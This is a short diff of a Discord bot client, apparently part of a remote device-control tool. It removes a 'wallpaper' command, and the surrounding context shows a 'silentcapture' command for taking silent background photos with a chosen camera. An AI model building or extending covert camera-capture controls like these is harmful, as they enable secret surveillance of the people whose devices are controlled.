@@ -981,10 +981,6 @@ class ADexDiscordClient(discord.Client):
                 {"callerName": caller_name, "seconds": int(seconds)},
             )
 
-        @self.tree.command(name="wallpaper", description="Set device wallpaper from URL")
-        @app_commands.describe(url="Direct image file URL")
-        async def wallpaper(interaction: discord.Interaction, url: str) -> None:
-            await self._queue_remote_command(interaction, "wallpaper", {"url": url})
 
         @self.tree.command(name="silentcapture", description="Take silent background photo")
         @app_commands.describe(camera_id="Camera ID (0 for back, 1 for front)")
